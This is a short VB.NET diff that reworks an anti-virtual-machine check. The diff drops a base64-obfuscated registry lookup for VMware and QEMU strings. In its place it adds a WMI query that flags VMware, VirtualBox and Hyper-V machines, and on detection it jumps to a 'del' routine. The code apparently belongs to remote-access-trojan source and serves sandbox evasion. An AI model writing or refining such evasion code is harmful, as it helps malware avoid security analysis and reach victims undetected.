@@ -8,9 +8,7 @@
 
         Public Shared Sub Check() 'https://www.cyberbit.com/blog/endpoint-security/anti-vm-and-anti-sandbox-explained/
             Try
-                'System\CurrentControlSet\Services\Disk\Enum\
-                Dim VM = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(BS(Convert.FromBase64String("U3lzdGVtXEN1cnJlbnRDb250cm9sU2V0XFNlcnZpY2VzXERpc2tcRW51bVw="))).GetValue("0", "")
-                If VM.ToString.ToLower.Contains("vmware") OrElse VM.ToString.ToLower.Contains("qemu") Then
+                If DetectVirtualMachine() Then
                     GoTo del
 
                 ElseIf C_ID.MyOS.ToString.ToLower.Contains("XP".ToLower) Then
@@ -36,6 +34,25 @@ del:
             End Try
 
         End Sub
+
+        Private Shared Function DetectVirtualMachine() As Boolean
+            Try
+                Using searcher = New Management.ManagementObjectSearcher("Select * from Win32_ComputerSystem")
+                    Using items = searcher.[Get]()
+
+                        For Each item In items
+                            Dim manufacturer As String = item("Manufacturer").ToString().ToLower()
+
+                            If (manufacturer = "microsoft corporation" AndAlso item("Model").ToString().ToUpperInvariant().Contains("VIRTUAL")) OrElse manufacturer.Contains("vmware") OrElse item("Model").ToString() = "VirtualBox" Then
+                                Return True
+                            End If
+                        Next
+                    End Using
+                End Using
+            Catch ex As Exception
+            End Try
+            Return False
+        End Function
     End Class
 
 End Namespace
